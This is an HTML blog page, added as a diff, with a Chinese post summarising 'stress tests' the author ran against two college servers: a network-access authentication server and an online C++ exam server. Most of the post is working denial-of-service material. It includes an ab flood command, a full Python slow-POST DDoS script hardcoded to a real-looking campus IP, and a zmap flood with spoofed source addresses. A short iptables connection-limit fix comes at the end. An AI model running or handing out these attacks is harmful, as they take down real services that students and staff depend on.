@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="title:对学院部分网站的压力测试总结（附命令及源码）date:2016-01-22 15:31:26
+#####0x00最近几天，我就自己学院和计算机中心的两个网站进行了几次压力测试，终于把服务器从一台笔记本都能打瘫搞到了几台云服务器都打不瘫的地步。
+#####0x01两台服务器分别是一台用来内网上网许可验证的服务器和一台在线c++考试的服务器（https://github.com/Ph0en">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/2017/03/26/对学院部分网站的压力测试总结（附命令及源码）/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="title:对学院部分网站的压力测试总结（附命令及源码）date:2016-01-22 15:31:26
+#####0x00最近几天，我就自己学院和计算机中心的两个网站进行了几次压力测试，终于把服务器从一台笔记本都能打瘫搞到了几台云服务器都打不瘫的地步。
+#####0x01两台服务器分别是一台用来内网上网许可验证的服务器和一台在线c++考试的服务器（https://github.com/Ph0en">
+<meta property="og:updated_time" content="2017-03-27T10:11:16.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+<meta name="twitter:description" content="title:对学院部分网站的压力测试总结（附命令及源码）date:2016-01-22 15:31:26
+#####0x00最近几天，我就自己学院和计算机中心的两个网站进行了几次压力测试，终于把服务器从一台笔记本都能打瘫搞到了几台云服务器都打不瘫的地步。
+#####0x01两台服务器分别是一台用来内网上网许可验证的服务器和一台在线c++考试的服务器（https://github.com/Ph0en">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-对学院部分网站的压力测试总结（附命令及源码）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/26/对学院部分网站的压力测试总结（附命令及源码）/" class="article-date">
+  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>title:对学院部分网站的压力测试总结（附命令及源码）<br>date:2016-01-22 15:31:26</p>
+<p>#####0x00<br>最近几天，我就自己学院和计算机中心的两个网站进行了几次压力测试，终于把服务器从一台笔记本都能打瘫搞到了几台云服务器都打不瘫的地步。</p>
+<p>#####0x01<br>两台服务器分别是一台用来内网上网许可验证的服务器和一台在线c++考试的服务器（<a href="https://github.com/Ph0enixxx/hustoj" target="_blank" rel="external">https://github.com/Ph0enixxx/hustoj</a>）</p>
+<p>以下是我用到的命令和代码：</p>
+<p>1）利用Apache自带的ab工具</p>
+<pre><code>ab -n 1000000 -c 200 http://x.x.119.110/
+</code></pre><p>每个服务器都显示了较大程度的卡顿</p>
+<p>2）python ddos代码：</p>
+<p>这是网上找到的一个http慢攻击的代码</p>
+<p>和1的原理差不多，不过威力更大。</p>
+<pre><code> #!/usr/bin/env python  
+import socket  
+import time  
+import threading  
+#Pressure Test,ddos tool  
+#---------------------------  
+MAX_CONN=2000000  
+PORT=80  
+HOST=&quot;202.194.119.106&quot;
+PAGE=&quot;/&quot;  
+#---------------------------  
+
+buf=(&quot;POST %s HTTP/1.1\r\n&quot;  
+&quot;Host: %s\r\n&quot;  
+&quot;Content-Length: 10000000\r\n&quot;  
+&quot;Cookie: dklkt_dos_test\r\n&quot;  
+&quot;\r\n&quot; % (PAGE,HOST))  
+
+socks=[]  
+
+def conn_thread():  
+    global socks  
+    for i in range(0,MAX_CONN):  
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
+        try:  
+            s.connect((HOST,PORT))  
+            s.send(buf)  
+            print &quot;Send buf OK!,conn=%d\n&quot;%i  
+            socks.append(s)  
+        except Exception,ex:  
+            print &quot;Could not connect to server or send error:%s&quot;%ex  
+            time.sleep(10)  
+#end def  
+
+def send_thread():  
+    global socks  
+    while True:  
+        for s in socks:  
+            try:  
+                s.send(&quot;f&quot;)  
+                #print &quot;send OK!&quot;  
+            except Exception,ex:  
+                print &quot;Send Exception:%s\n&quot;%ex  
+                socks.remove(s)  
+                s.close()  
+        time.sleep(1)  
+#end def  
+
+conn_th=threading.Thread(target=conn_thread,args=())  
+send_th=threading.Thread(target=send_thread,args=())  
+
+conn_th.start()  
+send_th.start() 
+</code></pre><p>3）zmap<br>zmap是一个快速的扫描器，我参考了<a href="http://drops.wooyun.org/tools/515" target="_blank" rel="external">Zmap详细用户手册和DDOS的可行性</a><br>这篇文章</p>
+<p>代码如下：</p>
+<pre><code>sudo zmap -P 10000000 -s 2000-60000 -S 20.20.20.0-200.200.200.200 x.x.119.106 -p 80
+</code></pre><p>解决：</p>
+<p>设置iptables</p>
+<pre><code>iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT
+</code></pre><p>单个ip最大连接数30 超过者访问拒绝</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/03/26/对学院部分网站的压力测试总结（附命令及源码）/" data-id="cj0ryfudl0047c6otxt3ersfw" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/03/26/学校内部免费上网教程/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/03/26/微信公众号自动回复示例代码/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  
+    
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a><span class="archive-list-count">173</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/03/26/c++ std::random_shuffle()实现/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/26/About/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/26/Ajax模板/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/26/Bing背景图片API/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/26/Django教程：创建投票App Part 2/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
